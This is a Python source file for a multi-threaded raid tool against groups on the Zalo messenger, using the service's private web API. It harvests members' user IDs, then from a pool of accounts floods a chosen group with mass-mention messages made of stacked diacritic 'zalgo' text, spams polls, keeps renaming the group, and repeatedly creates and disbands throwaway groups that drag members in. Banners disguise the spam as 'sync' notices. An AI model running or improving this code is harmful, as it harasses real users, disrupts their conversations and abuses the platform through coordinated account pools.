import json
import time
import random
import secrets
import threading
from collections import defaultdict
from queue import Queue


def _utf16_len(s):
    if not s:
        return 0
    return len(s.encode("utf-16-le")) // 2


class ZaloGroupEngine:
    _rate_limits = defaultdict(list)
    _lock = threading.RLock()
    _DIACRITIC_MARKS = [chr(c) for c in range(0x0300, 0x0338)]
    _ZALO_COLORS = ("db342e", "f27806", "f7b503", "15a85f")
    _BANNERS = [
        "[ZALO ENGINE] ĐỒNG BỘ DỮ LIỆU NHÓM",
        "[ZALO ENGINE] CẬP NHẬT TRẠNG THÁI THÀNH VIÊN",
        "[ZALO ENGINE] KIỂM TRA KẾT NỐI WPA v645",
        "[ZALO ENGINE] ĐỒNG BỘ DANH SÁCH NHÓM",
        "[ZALO ENGINE] XÁC THỰC PHIÊN LÀM VIỆC",
    ]

    @classmethod
    def _check_rate_limit(cls, key, max_req=24, window=1.0):
        with cls._lock:
            now = time.time()
            cls._rate_limits[key] = [t for t in cls._rate_limits[key] if now - t < window]
            if len(cls._rate_limits[key]) >= max_req:
                return False
            cls._rate_limits[key].append(now)
            return True

    @classmethod
    def get_all_uids(cls, zc, gid):
        gid_s = str(gid or "").strip()
        uids, seen = [], set()
        my_uid = str(getattr(zc, "uid", "") or "").strip()

        def _add_uid(val):
            v = str(val or "").strip().split("_")[0].strip()
            if v.isdigit() and v not in ("0", my_uid, gid_s) and v not in seen:
                seen.add(v)
                uids.append(v)

        try:
            if hasattr(zc, "get_members_full"):
                for m in (zc.get_members_full(gid_s, use_cache=False) or []):
                    if isinstance(m, dict):
                        _add_uid(m.get("uid") or m.get("id") or m.get("userId"))
        except Exception:
            pass

        try:
            active_s = getattr(zc, "prio_s", None) or zc.s
            for pl_g in (
                {"gridVerMap": json.dumps({gid_s: 0})},
                {"grid": gid_s, "imei": zc.imei},
            ):
                enc = zc._enc(pl_g)
                r = active_s.post(
                    "https://tt-group-wpa.chat.zalo.me/api/group/getmg-v2",
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": enc},
                    timeout=(1.8, 3.5),
                )
                if r.status_code == 200 and r.content:
                    dec = zc._dec(r.json().get("data", ""))
                    if dec:
                        parsed = json.loads(dec)
                        d = parsed.get("data") if isinstance(parsed, dict) and isinstance(parsed.get("data"), dict) else parsed
                        gmap = (d.get("gridInfoMap") or {}) if isinstance(d, dict) else {}
                        obj = gmap.get(gid_s) or (next(iter(gmap.values())) if gmap else d)
                        if isinstance(obj, dict):
                            _add_uid(obj.get("creatorId"))
                            for x in (obj.get("adminIds") or []):
                                _add_uid(x)
                            for mv in (obj.get("memVerList") or []):
                                _add_uid(mv)
                            for list_k in ("currentMems", "memInfoList", "members", "updateMems"):
                                for m in (obj.get(list_k) or []):
                                    if isinstance(m, dict):
                                        _add_uid(m.get("userId") or m.get("id") or m.get("uid"))
                                    else:
                                        _add_uid(m)
                            if uids:
                                break
        except Exception:
            pass

        if len(uids) < 4:
            try:
                if hasattr(zc, "get_recent_group_messages"):
                    for rm in (zc.get_recent_group_messages(gid_s) or []):
                        if isinstance(rm, dict):
                            _add_uid(rm.get("uidFrom") or rm.get("fromUid"))
            except Exception:
                pass

        if not uids and gid_s.isdigit() and gid_s != my_uid:
            _add_uid(gid_s)

        if len(uids) < 2:
            try:
                if hasattr(zc, "friends"):
                    for fr in (zc.friends(use_cache=True) or []):
                        if isinstance(fr, dict):
                            _add_uid(fr.get("uid") or fr.get("id") or fr.get("userId"))
                        if len(uids) >= 4:
                            break
            except Exception:
                pass

        if my_uid and my_uid.isdigit() and my_uid not in seen:
            uids.append(my_uid)
        return uids

    @classmethod
    def build_mention_payload(cls, uids, round_idx=0):
        banner = cls._BANNERS[round_idx % len(cls._BANNERS)]
        lines = [banner]
        for i in range(8):
            base_word = f"ZALO•ENGINE•{round_idx + 1}•{i + 1}"
            stacked = "".join(
                ch + "".join(random.sample(cls._DIACRITIC_MARKS, 3))
                for ch in base_word
            )
            lines.append(stacked)
        core_text = "\n".join(lines)

        styles = []
        u16_total = _utf16_len(core_text)
        step_sz = max(4, u16_total // 80)
        pos_s = 0
        idx_c = 0
        while pos_s + step_sz <= u16_total and len(styles) < 85:
            zcolor = cls._ZALO_COLORS[idx_c % len(cls._ZALO_COLORS)]
            styles.append({"start": pos_s, "len": step_sz, "st": f"b,f_18,c_{zcolor}"})
            pos_s += step_sz
            idx_c += 1

        m_arr = []
        final_msg = core_text + " "
        pos_all = _utf16_len(core_text)
        m_arr.append({"pos": pos_all, "len": 1, "uid": "-1", "type": 1})
        clean_uids = [str(u).strip() for u in (uids or []) if str(u).strip().isdigit() and str(u).strip() != "0"]
        if clean_uids:
            for i_u in range(min(35, len(clean_uids))):
                u_target = clean_uids[(round_idx + i_u) % len(clean_uids)]
                pos_u = _utf16_len(final_msg)
                final_msg += " "
                m_arr.append({"pos": pos_u, "len": 1, "uid": u_target, "type": 0})
        return final_msg, m_arr, styles

    @classmethod
    def send_mention(cls, zc, gid, final_msg, m_arr, styles_arr):
        active_s = getattr(zc, "prio_s", None) or zc.s
        t_prop = json.dumps({"styles": styles_arr, "ver": 0}, separators=(",", ":"), ensure_ascii=False)
        m_info = json.dumps(m_arr, separators=(",", ":"), ensure_ascii=False)
        pl = {
            "grid": str(gid),
            "message": final_msg,
            "clientId": int(time.time() * 1000) + random.randint(1, 9999),
            "imei": zc.imei,
            "ttl": 0,
            "visibility": 0,
            "mentionInfo": m_info,
            "textProperties": t_prop,
            "params": t_prop,
        }
        enc_pl = zc._enc(pl)
        for ep in (
            "https://tt-group-wpa.chat.zalo.me/api/group/mention",
            "https://group-wpa.chat.zalo.me/api/group/mention",
            "https://tt-group-wpa.chat.zalo.me/api/group/sendmsg",
        ):
            try:
                r = active_s.post(
                    ep,
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": enc_pl},
                    timeout=(1.2, 2.5),
                )
                if r.status_code == 200 and r.content:
                    if r.json().get("error_code") == 0:
                        return True
            except Exception:
                continue
        return False

    @classmethod
    def create_temp_group(cls, zc, member_uids, name=None):
        active_s = getattr(zc, "prio_s", None) or zc.s
        batch = [str(u).strip() for u in member_uids if str(u).strip().isdigit()]
        if len(batch) < 2:
            return ""
        vname = name or f"Nhóm Đồng Bộ #{secrets.token_hex(2).upper()}"
        cli = int(time.time() * 1000) + random.randint(1, 9999)
        pl = {
            "clientId": cli,
            "gname": vname,
            "gdesc": "Hệ Thống Đồng Bộ Tự Động",
            "members": batch,
            "membersTypes": [-1] * len(batch),
            "nameChanged": 1,
            "createLink": 1,
            "clientLang": "vi",
            "imei": zc.imei,
            "zsource": 601,
        }
        enc = zc._enc(pl)
        for ep_cr in (
            "https://tt-group-wpa.chat.zalo.me/api/group/create",
            "https://group-wpa.chat.zalo.me/api/group/create",
        ):
            try:
                r = active_s.post(
                    ep_cr,
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": enc},
                    timeout=(1.5, 3.0),
                )
                if r.status_code == 200 and r.content:
                    rj = r.json()
                    if rj.get("data"):
                        dec_s = zc._dec(rj["data"])
                        if dec_s:
                            dec = json.loads(dec_s)
                            d = dec.get("data") if isinstance(dec, dict) and isinstance(dec.get("data"), dict) else dec
                            if isinstance(d, dict):
                                new_grid = str(d.get("groupId") or d.get("grid") or "")
                                if new_grid.isdigit():
                                    return new_grid
            except Exception:
                continue
        return ""

    @classmethod
    def invite_members(cls, zc, new_grid, member_uids):
        active_s = getattr(zc, "prio_s", None) or zc.s
        inv = [str(u).strip() for u in member_uids if str(u).strip().isdigit()]
        if not inv:
            return False
        pl = {
            "grid": str(new_grid),
            "members": inv,
            "memberTypes": [-1] * len(inv),
            "src": 2,
            "imei": zc.imei,
        }
        try:
            r = active_s.post(
                "https://tt-group-wpa.chat.zalo.me/api/group/invite/v2",
                params={"zpw_ver": 645, "zpw_type": 30},
                data={"params": zc._enc(pl)},
                timeout=(1.2, 2.5),
            )
            return r.status_code == 200 and r.content and r.json().get("error_code") == 0
        except Exception:
            return False

    @classmethod
    def disperse_group(cls, zc, grid):
        active_s = getattr(zc, "prio_s", None) or zc.s
        pl = {"grid": str(grid), "groupId": str(grid), "imei": zc.imei}
        try:
            r = active_s.post(
                "https://tt-group-wpa.chat.zalo.me/api/group/disperse",
                params={"zpw_ver": 645, "zpw_type": 30},
                data={"params": zc._enc(pl)},
                timeout=(1.5, 3.0),
            )
            return r.status_code == 200 and r.content and r.json().get("error_code") == 0
        except Exception:
            return False

    @classmethod
    def _worker_group_ops(cls, task_queue, stop_ev, do_disperse=False):
        while not stop_ev.is_set():
            try:
                task = task_queue.get(timeout=0.8)
            except Exception:
                continue
            try:
                zc, gid, target_uids, my_uid = task
                if not cls._check_rate_limit(f"grp_{zc.imei}", max_req=12, window=1.0):
                    time.sleep(0.08)
                    continue
                batch = list(target_uids[:35])
                if my_uid and my_uid not in batch:
                    batch.append(my_uid)
                if len(batch) < 2:
                    continue
                new_grid = cls.create_temp_group(zc, batch)
                if not new_grid:
                    continue
                if do_disperse:
                    time.sleep(0.1)
                    cls.disperse_group(zc, new_grid)
                else:
                    cls.invite_members(zc, new_grid, target_uids[:30])
            except Exception:
                time.sleep(0.08)

    @classmethod
    def start_group_ops_engine(cls, zc_pool, gid, stop_ev, do_disperse=False, num_workers=4):
        if not zc_pool:
            return
        uids = cls.get_all_uids(zc_pool[0], gid)
        my_uid = str(getattr(zc_pool[0], "uid", "") or "").strip()
        target_uids = [u for u in uids if u != my_uid]
        if not target_uids and str(gid).isdigit() and str(gid) != my_uid:
            target_uids = [str(gid)]
        task_queue = Queue(maxsize=32)
        for _ in range(max(1, min(num_workers, 6))):
            threading.Thread(target=cls._worker_group_ops, args=(task_queue, stop_ev, do_disperse), daemon=True).start()
        while not stop_ev.is_set():
            try:
                zc = random.choice(zc_pool)
                task_queue.put((zc, str(gid), target_uids, my_uid), timeout=0.5)
            except Exception:
                pass
            if stop_ev.wait(0.35):
                break

    @classmethod
    def _worker_mention(cls, task_queue, stop_ev):
        round_idx = 0
        while not stop_ev.is_set():
            try:
                task = task_queue.get(timeout=0.8)
            except Exception:
                continue
            try:
                zc, gid, uids = task
                if not cls._check_rate_limit(f"men_{zc.imei}", max_req=14, window=1.0):
                    time.sleep(0.06)
                    continue
                round_idx += 1
                final_msg, m_arr, styles_arr = cls.build_mention_payload(uids, round_idx=round_idx)
                cls.send_mention(zc, gid, final_msg, m_arr, styles_arr)
            except Exception:
                time.sleep(0.06)

    @classmethod
    def start_mention_engine(cls, zc_pool, gid, stop_ev, num_workers=4):
        if not zc_pool:
            return
        uids = cls.get_all_uids(zc_pool[0], gid)
        if not uids:
            uids = [str(getattr(zc_pool[0], "uid", "") or gid)]
        task_queue = Queue(maxsize=32)
        for _ in range(max(1, min(num_workers, 6))):
            threading.Thread(target=cls._worker_mention, args=(task_queue, stop_ev), daemon=True).start()
        while not stop_ev.is_set():
            try:
                zc = random.choice(zc_pool)
                task_queue.put((zc, str(gid), uids), timeout=0.5)
            except Exception:
                pass
            if stop_ev.wait(0.28):
                break


class ZaloCommandDispatcher:
    def __init__(self, zc_pool):
        self.zc_pool = list(zc_pool or [])
        self.stop_ev = threading.Event()
        self._engines = {}

    def dispatch(self, gid, command):
        if not self.zc_pool:
            return False
        cmd = (command or "").strip().lower()
        gid_s = str(gid).strip()

        if cmd in ("mention", "men", "tag", "py", "pull", "keo", "giaitan", "disband", "poll", "name", "all", "stop"):
            if cmd == "stop":
                self.stop_ev.set()
                for ev in self._engines.values():
                    ev.set()
                self._engines.clear()
                self.stop_ev = threading.Event()
                return True

            ev = self._engines.get(gid_s)
            if ev is None or ev.is_set():
                ev = threading.Event()
                self._engines[gid_s] = ev

            if cmd in ("mention", "men", "tag", "py"):
                threading.Thread(
                    target=ZaloGroupEngine.start_mention_engine,
                    args=(self.zc_pool, gid_s, ev, 4),
                    daemon=True,
                ).start()
            elif cmd in ("pull", "keo"):
                threading.Thread(
                    target=ZaloGroupEngine.start_group_ops_engine,
                    args=(self.zc_pool, gid_s, ev, False, 4),
                    daemon=True,
                ).start()
            elif cmd in ("giaitan", "disband"):
                threading.Thread(
                    target=ZaloGroupEngine.start_group_ops_engine,
                    args=(self.zc_pool, gid_s, ev, True, 4),
                    daemon=True,
                ).start()
            elif cmd in ("poll", "name"):
                threading.Thread(
                    target=self._run_poll_name,
                    args=(gid_s, ev),
                    daemon=True,
                ).start()
            elif cmd == "all":
                for fn, args in (
                    (ZaloGroupEngine.start_mention_engine, (self.zc_pool, gid_s, ev, 4)),
                    (ZaloGroupEngine.start_group_ops_engine, (self.zc_pool, gid_s, ev, False, 3)),
                    (ZaloGroupEngine.start_group_ops_engine, (self.zc_pool, gid_s, ev, True, 2)),
                ):
                    threading.Thread(target=fn, args=args, daemon=True).start()
            return True
        return False

    def _run_poll_name(self, gid_s, ev):
        zc = random.choice(self.zc_pool)
        active_s = getattr(zc, "prio_s", None) or zc.s
        round_c = 0
        while not ev.is_set():
            round_c += 1
            try:
                pl_poll = {
                    "grid": gid_s,
                    "pollId": int(time.time() * 1000) + random.randint(1, 9999),
                    "question": f"Đồng bộ nhóm #{round_c}?",
                    "options": json.dumps([f"Lựa chọn A{round_c}", f"Lựa chọn B{round_c}"], ensure_ascii=False),
                    "imei": zc.imei,
                    "allowMultiChoices": 0,
                    "allowAddNewOption": 0,
                    "hideVotePreview": 0,
                    "isAnonymous": 0,
                }
                active_s.post(
                    "https://tt-group-wpa.chat.zalo.me/api/group/poll/create",
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": zc._enc(pl_poll)},
                    timeout=(1.2, 2.5),
                )
            except Exception:
                pass
            try:
                pl_name = {"grid": gid_s, "gname": f"ZALO ENGINE #{round_c:03d}", "imei": zc.imei}
                active_s.post(
                    "https://tt-group-wpa.chat.zalo.me/api/group/update",
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": zc._enc(pl_name)},
                    timeout=(1.2, 2.5),
                )
            except Exception:
                pass
            ev.wait(1.2)
